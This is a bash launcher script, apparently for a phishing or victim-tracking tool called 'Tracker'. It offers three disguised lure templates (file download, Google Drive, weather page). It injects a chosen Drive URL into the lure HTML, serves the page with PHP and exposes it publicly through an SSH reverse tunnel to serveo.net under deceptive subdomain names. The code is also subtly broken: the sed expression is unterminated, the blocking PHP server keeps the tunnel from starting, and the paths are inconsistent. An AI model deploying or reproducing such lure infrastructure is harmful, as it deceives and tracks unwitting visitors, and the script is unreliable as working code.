Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
White='\033[0;37m'        # White


echo -e "${Green}Choose the Template:"
echo
echo -e "${Yellow}[+] 1. File Download"
echo "[+] 2. Google Drive"
echo "[+] 3. Weather Page"
echo "."
echo "."
echo "."
echo "."

read -p ">> Enter Template Number: " tempno

echo "."
echo "."
echo "."
echo "."

filedownload(){

    echo "Starting PHP Server..."
    cd /Tracker/filedownload
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
    
}

gdrive(){

    read -p ">> Enter Google Drive File URL: " gdriveurl  #receiving replaceable drive url
    cd Tracker/gdrive
    sed -i "s/oldurl/$gdriveurl" index.html
    echo "Success, Google Drive url injected.."
    echo "."
    echo "."
    echo "Starting PHP Server..."
    cd /Tracker/gdrive
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
    
}

weather(){

    echo "Starting PHP Server..."
    cd /Tracker/weather
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
    
}


if [ $tempno == 1 ]
then
    echo "Executing File Downloader Template"
    filedownload

elif [ $tempno == 2 ]
then 
    echo "Executing Google Drive Template"
    gdrive

elif [ $tempno == 3 ]
then
    echo "Executing Weather Template"
    weather
else
    echo -e "${Red}Please choose a proper Template!"
fi